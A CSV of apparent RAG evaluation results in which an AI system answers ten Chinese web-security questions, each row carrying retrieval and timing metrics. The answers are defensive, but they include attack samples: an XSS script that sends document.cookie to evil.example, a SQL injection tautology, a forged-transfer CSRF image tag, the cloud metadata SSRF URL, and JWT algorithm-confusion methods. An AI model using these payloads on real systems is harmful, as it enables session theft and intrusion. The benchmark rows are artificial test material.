taskId,taskName,mode,itemId,question,answer,retrievalTimeMs,generationTimeMs,totalTimeMs,promptTokens,completionTokens,retrievalHit,precisionAtK,recallAtK,mrr,keywordHitRate,citationMatched,manualCorrectness,manualRelevance,manualCompleteness,manualHallucination,error
6,Top-K实验-K1,RAG_LLM,1,什么是 SQL 注入?如何防御?,"# SQL 注入：定义与防御  ## 一、什么是 SQL 注入  > **说明**：当前知识库片段中未包含 SQL 注入的定义性描述，以下定义与危害分析为**通用安全常识，无知识库引用**。  SQL 注入是一种常见的 Web 安全漏洞，指攻击者将恶意 SQL 语句插入到应用程序的输入参数中，若应用程序直接将用户输入拼接进 SQL 语句执行，攻击者即可篡改原 SQL 语义，实现：  - **绕过认证**：如 `' OR '1'='1` 恒真条件登录 - **窃取数据**：通过 UNION 查询、报错注入等方式拖取数据库敏感信息 - **篡改/删除数据**：执行 UPDATE、DROP 等破坏性语句 - **进一步渗透**：部分场景下可写入 WebShell 甚至执行系统命令  ## 二、如何防御  ### 1. 知识库依据的防御措施  - **MyBatis 中全部使用 `#{}` 占位符**，即预编译参数化方式传参，避免使用 `${}` 进行字符串拼接 [1]  ```java // ❌ 错误示例：使用 ${} 拼接，存在 SQL 注入风险 @Select(""SELECT * FROM users WHERE username = '${username}'"")  // ✅ 正确示例：使用 #{} 预编译占位符 @Select(""SELECT * FROM users WHERE username = #{username}"") ```  - **动态排序字段使用白名单映射**：`ORDER BY` 后的列名、排序方向无法通过预编译参数化处理，必须通过白名单校验映射 [1]  ```java // ✅ 动态排序字段白名单映射 Map<String, String> SORT_WHITELIST = Map.of(     ""createTime"", ""create_time"",     ""username"",   ""username"" );  // 不在白名单内的字段统一回退到默认排序，拒绝拼接 String column = SORT_WHITELIST.getOrDefault(requestField, ""create_time""); ```  ### 2. 通用防御补充  > **说明**：以下为**通用安全常识，无知识库引用**，作为知识库措施的补充。  - **全程使用参数化查询/预编译语句**（如 JDBC 的 `PreparedStatement`、ORM 框架的参数绑定） - **输入校验**：对用户输入做类型、长度、格式校验，拒绝异常字符 - **最小权限原则**：应用连接数据库的账号仅授予必要权限，禁用 FILE、DROP 等高危权限 - **隐藏数据库错误信息**：避免将 SQL 报错细节返回给前端，防止报错注入利用 - **部署 WAF**：作为纵深防御手段拦截常见注入 Payload - **代码审计与渗透测试**：重点排查所有 `${}` 拼接点及原生 SQL 拼接语句  ## 三、总结  | 措施 | 类型 | 依据 | |---|---|---| | MyBatis 全部使用 `#{}` 预编译 | 核心防御 | [1] | | 动态排序字段白名单映射 | 核心防御 | [1] | | 输入校验、最小权限、WAF 等 | 通用补充 | 无（通用知识） |  **核心原则**：凡是能参数化的地方一律使用预编译占位符；无法参数化（如排序字段、表名）的场景，必须使用**服务端白名单**严格控制取值范围。",360,32346,32706,276,1360,0,0.0000,0.0000,0.0000,1.0000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,2,MyBatis 中 #{} 和 ${} 的区别是什么?,"# MyBatis 中 `#{}` 与 `${}` 的区别  ## 一、知识库依据  根据知识库片段，可确认以下安全结论：  - **防护建议**：在 MyBatis 中应**全部使用 `#{}`** 进行参数占位，以实现 SQL 注入防护 [1] - **特殊场景**：对于**动态排序字段**等无法直接参数化的场景，应使用**白名单映射**的方式进行限制 [1]  ## 二、当前知识库中未找到充分依据的部分  需要说明的是，当前知识库片段中**未详细解释 `#{}` 与 `${}` 的底层技术原理差异**，以下内容为通用安全常识补充(无知识库引用)：  ### 1. 底层机制差异  | 对比项 | `#{}` | `${}` | |--------|-------|-------| | 处理方式 | 预编译参数占位(`PreparedStatement` 的 `?` 占位) | 字符串直接拼接替换 | | 是否防注入 | ✅ 安全，值经参数绑定自动转义 | ❌ 不安全，值原样拼入 SQL | | 典型用途 | 传入选定字段值、条件值 | 表名、列名、`ORDER BY` 字段等 |  ### 2. 示例对比  **安全写法(推荐，对应知识库建议)**：  ```xml <select id=""findUser"" resultType=""User"">     SELECT id, username FROM users WHERE username = #{username} </select> ```  **危险写法(存在 SQL 注入风险)**：  ```xml <select id=""findUser"" resultType=""User"">     SELECT id, username FROM users WHERE username = '${username}'     <!-- 若传入 ' OR '1'='1 可绕过条件 --> </select> ```  ### 3. `ORDER BY` 场景的处理(对应知识库白名单方案)  `ORDER BY` 后的列名无法用 `#{}` 参数化，按知识库建议应使用**白名单映射** [1]:  ```java // Java 侧白名单映射,而非直接信任前端传入 Map<String, String> sortColumns = Map.of(     ""createTime"", ""create_time"",     ""username"", ""username"" ); String column = sortColumns.getOrDefault(inputColumn, ""create_time""); ```  ```xml <select id=""listUsers"" resultType=""User"">     SELECT id, username, create_time FROM users ORDER BY ${sortColumn} ${sortOrder}     <!-- sortColumn/sortOrder 已在 Java 层经白名单校验 --> </select> ```  ## 三、总结  - **原则**：能使用 `#{}` 的场景一律使用 `#{}` [1] - **例外**：仅表名、列名、排序字段等必须用 `${}` 的场景，必须配合**白名单校验/映射** [1] - **危害提示**：误用 `${}` 处理用户可控输入，可导致攻击者通过注入额外 SQL 语句实现数据泄露、篡改甚至提权(通用知识，无知识库引用)",331,28691,29023,281,1148,0,0.0000,0.0000,0.0000,1.0000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,3,XSS 有哪几种类型?分别如何防御?,"# XSS 的类型及防御方案  ## 一、XSS 简介  跨站脚本攻击(Cross-Site Scripting, CWE-79)是指攻击者向 Web 页面注入恶意脚本, 当其他用户浏览该页面时, 脚本在受害者浏览器中执行, 从而窃取会话 Cookie、篡改页面、发起钓鱼或键盘记录等攻击 [1]。  ## 二、XSS 的三种类型  根据知识库片段, XSS 共分为三种类型 [1]:  | 类型 | 特点 | |------|------| | **反射型 XSS** | 恶意脚本来自用户请求参数, 服务器将其""反射""回响应页面, 常见于搜索结果页 [1] | | **存储型 XSS** | 恶意脚本被持久化存储到数据库(如评论、个人简介), 所有访问者都会执行, **危害最大** [1] | | **DOM 型 XSS** | 由前端 JavaScript 不当操作 DOM 引起(如 `innerHTML` 写入未净化的 URL 参数), 数据不经过服务器 [1] |  **攻击示例**(存储型场景, 评论功能未过滤输出时, 攻击者可提交以下代码窃取 Cookie)[1]:  ```html <script>fetch('https://evil.example/steal?c=' + document.cookie)</script> ```  ## 三、防御方案  > ⚠️ **说明**: 当前知识库片段仅涵盖 XSS 的定义、类型与攻击示例, **未包含防御措施的具体内容, 即知识库中未找到防御方案的充分依据**。以下防御要点属于**通用安全常识, 无知识库引用**, 供参考:  **1. 通用防御措施(适用于所有类型)**  - **输出编码**: 根据输出上下文(HTML 标签、属性、JavaScript、URL)对特殊字符(如 `<`、`>`、`""`、`'`)进行转义。 - **输入校验**: 对用户输入做白名单格式校验(如邮箱、URL 格式), 但不能仅依赖输入过滤。 - **CSP(内容安全策略)**: 通过 `Content-Security-Policy` 响应头限制脚本来源, 即使注入成功也难以执行。 - **Cookie 安全属性**: 设置 `HttpOnly` 防止脚本读取 Cookie, 配合 `Secure`、`SameSite` 降低危害。 - **使用成熟框架**: 优先使用框架自带的自动转义机制(如 React/Vue 的默认转义), 避免手动拼接 HTML。  **2. 针对反射型 XSS**  - 服务端对所有反射回页面的请求参数进行编码后再输出。 - 避免将用户输入直接回显到 HTML 中。  **3. 针对存储型 XSS**  - 在数据入库前或**输出时**进行净化(推荐“输出时编码”策略)。 - 对富文本内容使用服务端 HTML 白名单净化库(如 DOMPurify、OWASP Java HTML Sanitizer)。  **4. 针对 DOM 型 XSS**  - 避免使用 `innerHTML`、`document.write`、`eval` 等危险 API 写入不可信数据。 - 改用安全的 DOM API, 如 `textContent`、`setAttribute`(配合属性白名单)。 - 对 URL 参数中的数据在插入 DOM 前进行校验与编码。  ---  **引用来源汇总**: 本文第一、二部分依据知识库片段 [1](XSS防护指南.md); 第三部分防御措施为通用安全知识补充, 无知识库引用。",344,23810,24155,475,932,1,1.0000,1.0000,1.0000,1.0000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,4,CSRF 攻击的原理是什么?有哪些防御手段?,"# CSRF 攻击原理与防御手段  ## 一、什么是 CSRF  跨站请求伪造(Cross-Site Request Forgery, CWE-352)是指攻击者诱导已登录用户的浏览器，在用户不知情的情况下向目标站点发送恶意请求。由于请求携带了用户的合法会话凭证(如 Cookie),服务器难以区分这是否为用户本人意愿，从而以用户身份执行了操作 [1]。  ## 二、攻击原理  ### 典型攻击流程  以银行站点为例：用户已登录 `bank.example`,会话 Cookie 仍然有效。攻击者在第三方页面埋入如下代码 [1]:  ```html <img src=""https://bank.example/transfer?to=attacker&amount=10000""> ```  当用户访问该恶意页面时，浏览器会自动携带 Cookie 向银行站点发起转账请求，攻击即告完成 [1]。  ### 攻击成功的三个关键条件  1. 受害者在目标站点持有有效会话； 2. 目标操作仅需 Cookie 即可认证，无二次确认； 3. 攻击者能诱导受害者访问恶意页面 [1]。  ## 三、防御手段  ### 1. CSRF Token(知识库明确提到的主流方案)  知识库片段中指出，CSRF Token 是当前的主流防御方案，但该片段中关于 Token 的具体实现细节(如生成方式、存放位置、校验流程等)内容不完整 [1]。  以下为通用补充知识(无知识库引用)：  - **CSRF Token**:服务端为每个会话或每次请求生成随机 Token,嵌入表单或请求头中，服务端校验其有效性。攻击者所在第三方站点无法读取目标站点的 Token(受同源策略限制)，因此伪造的请求会因缺少合法 Token 被拒绝。 - **SameSite Cookie 属性**：将 Cookie 设置为 `SameSite=Lax` 或 `SameSite=Strict`,限制跨站请求自动携带 Cookie,从源头阻断 CSRF。 - **校验 Origin / Referer 头**：服务端检查请求来源是否为可信域名，拒绝来源不明的请求。 - **关键操作二次确认**：对转账、改密等敏感操作增加验证码、密码确认或短信验证等二次认证。 - **避免使用 GET 执行状态变更操作**：像示例中通过 URL 参数完成转账的设计本身就是高危反模式，应使用 POST 并配合上述防御。  ---  **说明**：以上“攻击原理”与“关键条件”部分依据知识库片段 [1];防御措施中除“CSRF Token 为主流方案”这一结论外，其余具体防御手段为通用安全常识补充，知识库片段未提供充分细节，无知识库引用。",347,21936,22283,467,877,1,1.0000,1.0000,1.0000,1.0000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,5,SSRF 是什么?云环境中最典型的危害是什么?,"## 一、SSRF 是什么？  **SSRF(Server-Side Request Forgery,服务端请求伪造，CWE-918)** 是指攻击者诱使服务器端应用向攻击者指定的地址发起请求 [1]。  其核心风险在于：**请求是由内网服务器发出的**，攻击者可以借此：  - 探测内网、访问内网服务(如通过返回差异或超时时间推断内网主机与端口存活情况，例如请求 `http://192.168.1.1:8080/`); - 读取云平台元数据； - 甚至借助内网管理接口控制服务器 [1]。  此外，SSRF 还可滥用协议(如利用 `file://` 读取本地文件、`gopher://`、`dict://` 构造任意报文)，并可通过十进制 IP、短链接、DNS 重绑定、`0.0.0.0`、`[::1]` 等方式绕过基于字符串的黑名单校验 [1]。  ## 二、云环境中最典型的危害：云元数据泄露与凭证窃取  在云环境中，最典型且危害最大的场景是**云元数据泄露** [1]:  - 攻击者通过 SSRF 请求云平台元数据服务，例如：   ```   http://169.254.169.254/latest/meta-data/   ``` - 该接口可能返回**实例凭证**； - 攻击者获取凭证后，可进一步**接管云资源**，造成影响范围远超单台服务器的严重后果 [1]。  ## 三、简要说明(通用安全常识，无知识库引用)  > 以下内容为通用补充，当前知识库片段未包含防御细节。  针对此类风险，通用防御思路包括：对用户可控的 URL 做协议白名单(仅允许 http/https)、解析后校验目标 IP 是否属于内网/链路本地地址段(如 `169.254.0.0/16`)、禁用不必要的协议、以及云平台层面启用元数据接口的访问控制(如 IMDSv2 类的会话令牌机制)。",737,21795,22533,529,794,1,1.0000,1.0000,1.0000,1.0000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,6,JWT 常见的安全风险有哪些?,"# JWT 常见安全风险  根据知识库片段，JWT 常见安全风险主要包括以下几类：  ## 一、算法混淆攻击 [1]  **攻击原理：** - 服务端若直接信任 Token Header 中声明的签名算法，攻击者便可以篡改 `alg` 字段实施攻击，常见手法有两种 [1]：   1. 将 `alg` 改为 `none`,即声称“无签名”，从而绕过签名验证；   2. 将 RS256(非对称算法)篡改为 HS256(对称算法)，并**用公钥当作 HMAC 密钥**来伪造合法签名 [1]。  **危害：** 攻击者可伪造任意用户身份的合法 Token,实现身份冒充与越权访问。  **防御方案：** 服务端应**硬编码固定算法**，绝不从 Token 的 Header 中读取算法声明 [1]。  ## 二、密钥强度不足与硬编码 [1]  知识库片段中列出了该风险标题，但具体内容不完整。其核心含义为：若签名密钥过于简单(易被暴力破解)，或密钥被硬编码在代码/配置中(易随源码泄露)，攻击者便可自行签发任意合法 Token [1]。  **防御方案**(此部分为通用安全常识补充，无知识库引用)： - 使用高熵、足够长度的随机密钥(如 HS256 建议 ≥256 位)； - 密钥通过密钥管理系统(KMS)或环境变量注入，不写入源码与版本库； - 定期轮换密钥。  ---  **补充说明：** 除知识库中列出的两类风险外，JWT 在实践中还存在其他常见风险(以下均为通用安全常识，当前知识库中未找到充分依据，故不标注引用编号)：  - **Payload 信息泄露**：Payload 仅做 Base64Url 编码、并非加密，敏感信息(如身份证号、手机号)放入其中可被任何人解码读取； - **Token 无法主动撤销**：JWT 无状态设计导致注销/封禁后 Token 在过期前仍然有效，需配合黑名单或短有效期+Refresh Token 机制缓解； - **过期时间配置不当**:`exp` 设置过长会放大 Token 泄露后的危害窗口。  **总体防御建议**：固定签名算法、使用强密钥并安全存储、Payload 不放敏感信息、设置合理有效期，并配合 HTTPS 传输 [1](加密传输为通用补充)。",1004,26246,27251,471,956,1,1.0000,1.0000,1.0000,0.6000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,7,文件上传功能有哪些安全风险?如何防范?,"# 文件上传安全风险与防范  ## 一、文件上传的主要安全风险  根据知识库，文件上传功能是 Web 攻击的高发入口，主要风险包括以下五类 [1]：  1. **WebShell 上传**：攻击者上传可执行脚本(如 `shell.jsp`、`shell.php`),从而直接获得服务器控制权 [1]。 2. **目录穿越**：利用 `../../` 等路径字符将文件写到任意路径，覆盖服务器关键配置文件 [1]。 3. **存储型 XSS**:上传含恶意脚本的 HTML/SVG 文件，当其他用户浏览器直接渲染该文件时触发脚本执行 [1]。 4. **拒绝服务**:通过上传超大文件或畸形压缩包，耗尽服务器的磁盘与内存资源 [1]。 5. **恶意文件分发**:服务器被攻击者利用，当作恶意文件的中转站进行传播 [1]。  ## 二、防御措施  ### 1. 严格校验文件类型(白名单机制)[1]  - **扩展名白名单**：仅允许业务必需的文件类型(如 pdf、txt、md、docx),拒绝一切可执行扩展名 [1]。 - **文件头校验**：校验文件的 Magic Number,防止攻击者仅通过修改扩展名绕过检测；但需注意文件头本身也可能被伪造，因此**白名单 + 文件头校验必须配合使用** [1]。 - **内容深度校验**：使用成熟解析库读取文件内容，拒绝解析失败或内容异常的文件 [1]。  ### 2. 重命名存储  知识库中提及“重命名存储”作为防御措施之一，但**具体细节在当前知识库片段中未完整给出**。以下为通用安全常识补充(无知识库引用)：  - 为上传文件生成随机、不可预测的文件名(如 UUID),避免保留用户原始文件名，防止路径穿越和文件名注入； - 同时隐藏原始扩展名的可执行语义，降低直接解析执行的风险。  ### 3. 其他通用加固建议  以下内容为通用安全常识补充，**当前知识库片段中未找到充分依据**(无知识库引用)：  - **限制文件大小**：在应用层和 Web 服务器层设置上传大小上限，缓解拒绝服务风险； - **存储目录隔离**：将上传文件存储在 Web 根目录之外，或所在目录禁止执行脚本权限； - **服务端渲染控制**：对 HTML/SVG 等可能引发 XSS 的文件，返回时设置 `Content-Type` 与 `Content-Security-Policy` 等响应头，避免浏览器直接渲染执行； - **病毒扫描**：对上传文件进行恶意软件检测，尤其面向可分发的场景。  ## 三、小结  文件上传的核心防御思路是：**默认不信任用户输入的文件**——通过“白名单校验扩展名 + 文件头校验 + 内容解析校验”三重验证过滤恶意文件 [1],再辅以重命名存储、目录隔离等手段，形成纵深防御体系。",914,25322,26237,504,948,1,1.0000,1.0000,1.0000,0.5000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,8,BOLA 和 BFLA 的区别是什么?,"# BOLA 与 BFLA 的区别  ## 一、先说结论  根据当前知识库片段，**只有 BOLA(对象级授权失效)有充分的知识库依据**，BFLA(功能级授权失效)在知识库片段中仅出现在文档标题中，**未包含其详细内容**，因此 BFLA 部分需以通用安全常识补充说明(无知识库引用)。  ---  ## 二、BOLA:对象级授权失效  ### 漏洞本质  API 只验证了“你是谁”(认证)，却没有验证“这个对象是不是你的”(授权)，导致**横向越权** [1]:  ``` GET /api/invoices/5001 # A 用户查看自己的发票 → 200 GET /api/invoices/5002 # A 用户查看 B 用户的发票 → 若无归属校验, 同样 200 ```  BOLA 是 OWASP API Security Top 10 之首，也是数据泄露事件的最主要根因 [1]。  ### 高发场景  1. 自增整数主键暴露， 易于遍历(5001 → 5002 → ...) [1] 2. UUID 被误认为“不可猜测即安全”(一旦泄露仍可越权) [1] 3. 批量接口、导出接口、子资源路径(`/users/{id}/orders`)遗漏校验 [1] 4. 导航/回退接口复用了宽权限查询 [1]  ### 防御思路  每次数据访问都把“归属”写进查询条件(即始终校验数据对象与当前用户的从属关系)[1]。  ---  ## 三、BFLA:功能级授权失效  > ⚠️ **说明：当前知识库中未找到充分依据。** 以下内容为通用安全常识补充，无知识库引用。  **BFLA(Broken Function Level Authorization,功能级授权失效)** 的核心问题是：API 没有校验当前用户**是否有权调用某个功能/接口**，导致**垂直越权**。  典型示例：  ``` GET  /api/admin/users      # 普通用户调用管理员接口 → 若无角色校验, 返回数据 POST /api/admin/deleteUser # 普通用户调用删除功能 → 若无角色校验, 执行成功 ```  ---  ## 四、二者核心区别对比  | 对比维度 | BOLA(对象级) | BFLA(功能级) | |---------|--------------|--------------| | 校验缺失层面 | **数据对象**层面(这条数据是不是你的) | **功能/接口**层面(你能不能用这个功能) | | 越权方向 | **横向越权**(同级别用户之间互相访问数据) | **垂直越权**(低权限用户访问高权限功能) | | 典型例子 | A 用户通过遍历 ID 查看 B 用户的订单 | 普通用户直接调用管理员删除接口 | | 关注点 | 归属关系校验 | 角色/权限级别校验 |  > 注：表中 BOLA 的“横向越权”特征来自知识库 [1];BFLA 的特征为通用安全常识补充，无知识库引用。  ---  ## 五、总结  - **BOLA 管的是“数据”**：接口本身你可能有权访问，但访问的**具体对象**不属于你时就该拒绝 [1]。 - **BFLA 管的是“功能”**：这个接口(尤其是管理类功能)本身就**不允许**你这样的角色调用(通用常识)。  完整的防御应**两者兼顾**：接口入口处做角色/功能级授权(防 BFLA),数据访问处做对象归属校验(防 BOLA)。",2180,33874,36055,484,1352,1,1.0000,1.0000,1.0000,1.0000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,9,为什么不能使用 MD5 存储密码?应该用什么?,"## 一、知识库依据说明  **当前知识库中未找到充分依据**：所提供的知识库片段聚焦于 JWT（令牌）安全实践，未直接包含关于 MD5 或密码哈希算法的内容。  知识库中仅有两条原则与密码存储安全理念相通，可作参考：  - 弱密钥（如 `secret`、`123456`）可被暴力破解，防御上要求密钥强度足够（不低于 256 位）[1]； - 严禁以可读形式存放密码等敏感数据（知识库针对 JWT Payload 提出此要求，体现“密码不应以可还原/可读形式落地”的原则）[1]。  以下内容为**通用安全知识补充，无知识库引用**，请结合实际场景审慎采纳。  ---  ## 二、MD5 为什么不能用来存密码（通用知识）  | 问题 | 说明 | |------|------| | **计算速度过快** | MD5 设计时追求高吞吐，现代 GPU 每秒可计算数十亿次 MD5，攻击者对泄露的哈希库进行暴力破解/字典攻击的成本极低 | | **无内置加盐** | 相同密码始终产生相同哈希，攻击者可用预计算的彩虹表直接反查大量常见密码 | | **算法已被密码学攻破** | MD5 存在已知的碰撞攻击，作为安全哈希算法已不合规 | | **设计目标不符** | MD5 是通用完整性校验哈希，不是专为对抗“离线口令猜测”设计的密码哈希函数 |  简单地在 MD5 外面手工拼盐（如 `md5(salt + password)`）也**不推荐**，因为底层仍是极快哈希，无法有效抵抗 GPU 并行破解。  ---  ## 三、应该用什么（通用知识）  应使用**专用密码哈希算法**，核心特征：自动加盐 + 慢速计算 + 可调代价因子。  1. **Argon2id**（首选）：内存困难型，能同时抵抗 GPU/ASIC 并行攻击，为密码哈希竞赛冠军算法； 2. **bcrypt**：久经考验、生态成熟，自带盐和 cost 因子； 3. **scrypt**：内存困难型备选； 4. **PBKDF2-HMAC-SHA256/512**：迭代次数足够高时可用，常见于合规性要求场景（如 FIPS）。  ### 代码示例（Python / bcrypt）  ```python import bcrypt  # 注册时：自动加盐并哈希 hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)) # 存入数据库的是 hashed  # 登录时：验证 ok = bcrypt.checkpw(input_password.encode(), hashed) ```  ### 补充要点  - 数据库中应存储“算法标识 + 参数 + 盐 + 哈希”的完整格式（bcrypt/Argon2 输出自带），便于未来升级算法； - 用户修改密码、提升安全策略时，应使用新参数重新哈希； - 可选增加服务器端 pepper（存于环境变量或密钥管理服务，与知识库中“密钥仅通过环境变量或密钥管理服务注入”的原则一致 [1]）； - 密码哈希只解决存储安全，传输层仍需 HTTPS，登录接口需防暴力破解（限流、验证码）。",722,54090,54812,478,1602,0,0.0000,0.0000,0.0000,0.5000,1,0,0,0,0
6,Top-K实验-K1,RAG_LLM,10,RAG 系统的完整流程是什么?,"# RAG 系统的完整流程  ## 一、总体架构  RAG(Retrieval-Augmented Generation, 检索增强生成)采用**“先检索、后生成”的两阶段架构**： 用户提问后， 系统先从外部知识库检索相关内容， 再将其作为上下文交给 LLM 生成回答。该架构可以缓解大语言模型的三大缺陷： **知识截止、幻觉、私域知识缺失** [1]。  整体流程可分为两个阶段： **离线索引阶段**与**在线问答阶段** [1]。  ## 二、离线索引阶段  该阶段共包含五个步骤 [1]:  1. **文档解析**： 提取 PDF/TXT/MD/DOCX 等格式文档的文本内容 2. **清洗**： 去除控制字符、页眉页脚、乱码等噪声 3. **分块**: 按语义边界与固定长度切分为 chunk, 通常为 **256-1024 字符**， 相邻块保留重叠以保持语义连贯 4. **向量化**： 使用 Embedding 模型将每个 chunk 映射为稠密向量 5. **入库**: 将向量与原文、元数据(文档名、页码、块序号)一同存入向量数据库  ## 三、在线问答阶段  知识库片段中关于“在线问答阶段”的具体步骤内容**不完整(片段在此处截断)**， 当前知识库中未找到该阶段详细流程的充分依据。片段中仅能确认其总体思路： **先从知识库检索相关内容， 再作为上下文交给 LLM 生成回答** [1]。  以下为通用知识补充(无知识库引用， 仅供参考)：  1. **查询向量化**： 使用与索引阶段相同的 Embedding 模型将用户问题转为向量 2. **相似度检索**： 在向量数据库中执行最近邻搜索(如余弦相似度)， 取 Top-K 个最相关的 chunk 3. **上下文组装**： 将检索到的 chunk 与用户原始问题拼接为 Prompt 4. **LLM 生成**： 将 Prompt 交给大语言模型， 生成最终回答  ---  **说明**： 上述在线问答阶段的详细步骤为通用安全/技术常识补充， 未经知识库片段佐证； 若需要以知识库内容为准的完整描述， 请补充该片段被截断的部分。",480,24927,25407,497,1227,1,1.0000,1.0000,1.0000,0.8000,1,0,0,0,0
